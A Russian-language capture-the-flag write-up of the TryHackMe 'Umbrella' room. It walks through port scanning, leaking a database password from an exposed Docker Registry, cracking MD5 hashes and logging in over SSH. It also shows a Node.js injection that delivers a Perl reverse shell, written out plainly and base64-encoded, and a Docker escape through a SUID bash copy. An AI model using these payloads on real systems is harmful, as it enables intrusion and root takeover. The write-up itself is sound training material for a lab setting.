https://tryhackme.com/room/umbrella
### Разведка
nmap -sC -sV
- Стандартные скрипты
- сканирование версий

<img width="1217" height="639" alt="Pasted image 20251228210110" src="https://github.com/user-attachments/assets/37b2aaac-e0f1-479a-9ec3-7115ec2bce2c" />

- 22 -ssh
- 3306 - mysql
- 5000 - докер
- 8080 - веб приложуха на node.js 

<img width="1470" height="696" alt="Pasted image 20251228210238" src="https://github.com/user-attachments/assets/7786e48a-e1e5-4234-979e-4160db5b2fb4" />


Пробую перебрать директории, мб что то интересное будет
<img width="1223" height="537" alt="Pasted image 20251228210418" src="https://github.com/user-attachments/assets/82302778-b6cc-4ad6-9496-1f9e548b4bae" />


Короче я потыкал еще разные варианты, SQLi на 8080 (Раз уж у нас есть 3306 с mysql то скорее всего и БД и запросы к ней это SQL)

Видимо надо че то делать по докеру на 5000 порту, а точнее как показал nmap **Docker Registry (API: 2.0)**. 
Я нашел вот такую темку:
https://book.hacktricks.wiki/en/network-services-pentesting/5000-pentesting-docker-registry.html
Отсюда можно понять какие эндпоинты существуют у **Docker Registry (API: 2.0)**
	Делаем дальше



Есть пробитие!
Этот запрос - стандартный эндпоинт для докер регистри к нему мы и обратились. Теперь мы знаем какой репозиторий тут лежит

<img width="1013" height="547" alt="Pasted image 20251228213132" src="https://github.com/user-attachments/assets/1095b445-3047-4265-b0ce-2a0a0b98ed24" />



Отлично. Мы зашли в манифест со слоями. 

<img width="1238" height="459" alt="Pasted image 20251228213147" src="https://github.com/user-attachments/assets/16b3c4bf-0263-4f1c-bc3c-35be9c795e26" />


Нашел пасс от ДБ, сами ищите где он тут. 

### Эксплуатация

С небольшой суетой через старую версию mysql зашел все таки в ДБ с этим паролем и первый пункт выполнен.
<img width="1237" height="441" alt="Pasted image 20251228213230" src="https://github.com/user-attachments/assets/ca76af7e-c19a-4dde-980d-be2cc4943eb8" />


<img width="565" height="415" alt="Pasted image 20251228213316" src="https://github.com/user-attachments/assets/5237efb4-cd82-4d55-9ba7-77ab302e3be8" />
Нашел че то на 4 пользователей. думаю теперь можно залогиниться через ту панель входа с 8080 порта.
<img width="1470" height="778" alt="Pasted image 20251228214504" src="https://github.com/user-attachments/assets/0e2a297b-62ec-45d4-a957-22d58c220362" />


Под первыми кредами захожу куда-то. кстати пароль в md5 Хэширован, декрипт через hashcat
<img width="352" height="66" alt="Pasted image 20251228214811" src="https://github.com/user-attachments/assets/5df8db05-ba3f-428e-b12c-1513e394c0d1" />

Оказалось что те же креды подходят по ssh. На 8080 пока ничего не делаем

### User
<img width="748" height="489" alt="Pasted image 20251228214858" src="https://github.com/user-attachments/assets/064dc0b5-09d0-471d-9005-8c7b3fe5d3f9" />

Легчайший юзер 

### Root

<img width="981" height="632" alt="Pasted image 20251229144606" src="https://github.com/user-attachments/assets/5106d2f7-e287-466c-a0b9-a1fa8cd288ec" />

Дальше лазаю по файлам, нашел докер компос

И тут уже начинается жесткая дрочь с докером о котором я ничего не знаю, придется почитать что-то уже и понять что к чему. 

Я почитал про слои докера и про так называемые **digest** теперь все стало понятно. нам нужно вытянуть архив самого приложения. я нашел все по той же ссылке как взять слой необходимый, что бы наше приложение стянуть к себе на пк, через curl.
<img width="1230" height="107" alt="Pasted image 20251229145640" src="https://github.com/user-attachments/assets/bfc5c169-05c8-4c31-aa74-5c4573c5cc6c" />


ЕСТЬ! соси докер!

<img width="855" height="581" alt="Pasted image 20251229145923" src="https://github.com/user-attachments/assets/3598d92f-2dc1-4a09-9a06-c273721f7109" />

и вот в архиве нашел js код. изучаем. чувствую рут уже близко. Все, теперь мы полностью знаем как работает приложуха на 8080 порту.

#### Иньекция в node.js 
Напоминаю, что из сканирования портов мы узнали, что на 8080 запущен node.js

https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet

Смотрим вообще что мы отсюда можем вытянуть.

Тут чистейшей воды иньекция в node.js

Вот сама иньекция. И что бы ее передать и пройти фильтры перекодируем ее в base64
`perl -e 'use Socket;$i="192.168.180.184";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'`

Перекодили и в эхо.

`require('child_process').execSync('echo cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTkyLjE2OC4xODAuMTg0IjskcD00NDQ1O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vYmFzaCAtaSIpO307Jw= | base64 -d | bash')`

<img width="619" height="287" alt="Pasted image 20251229153312" src="https://github.com/user-attachments/assets/eeb4575b-9bb0-465d-8a3d-d8da933a5c69" />

Отправляем в форму на 8080. открываем порт и получаем шелл. 
<img width="759" height="153" alt="Pasted image 20251229153353" src="https://github.com/user-attachments/assets/98a82b3d-4b9c-4341-8dfc-067c1cf01e45" />


Но это еще не все. Данный шел не дает нам всех прав рут пользователя, это рут только в образе докер-контейнера, а не на всей машине. надо выйти из контейнера и стать рут на хосте. 

Как это сделать? 

Суть в том что тут есть мисконфигурация которая позволяет нам внутри контейнера монтирвоать файлы и отправлять их на хост. папка /logs с докер шелла и /logs с ssh одна и та же, вернее даже сказать что /logs НЕ внутренняя папка контейнера, а директория хоста

logs с root
<img width="477" height="441" alt="Pasted image 20251229182502" src="https://github.com/user-attachments/assets/2b59f5e7-d76e-4a46-bdea-5a520692d93a" />



logs c claire-r в директории timeTracker
<img width="676" height="535" alt="Pasted image 20251229183233" src="https://github.com/user-attachments/assets/ed5d01bf-e271-4bef-a0dd-66e901198a7b" />

Создадим там /bin/bash - файл, при запуске которого пользователь получит root права. Теперь, если с рут из докера выдать ему права на рут и дать выполнение юзером, то юзер получит рут (надеюсь понятно написал)


<img width="477" height="441" alt="Pasted image 20251229182502" src="https://github.com/user-attachments/assets/dd6fda46-0e57-4fb8-a7d6-f853376b2e0a" />

Выдали привилегии файлу

`chown root:root bash`
меняем владельца файла на root 

`chmod 4777 bash` 
4 - SUID
777 - все права

Теперт если любой пользователь запустит файл - он станет рутом, тк файл запускается с правами владельца файла, файлом владеет root. 

Выполняем файл и получаем привелегии рут пользователя
<img width="725" height="379" alt="Pasted image 20251229183437" src="https://github.com/user-attachments/assets/28b72d9a-7e29-4f05-81fa-efaf80c9e2bd" />

И получили наш рут флаг)

Мы запустили файл с флагом -p  это означает отсутствие сброса привилегий после выполнение скрипта(как я понимаю)



P.s. Это мой первый райтап, не судите строго
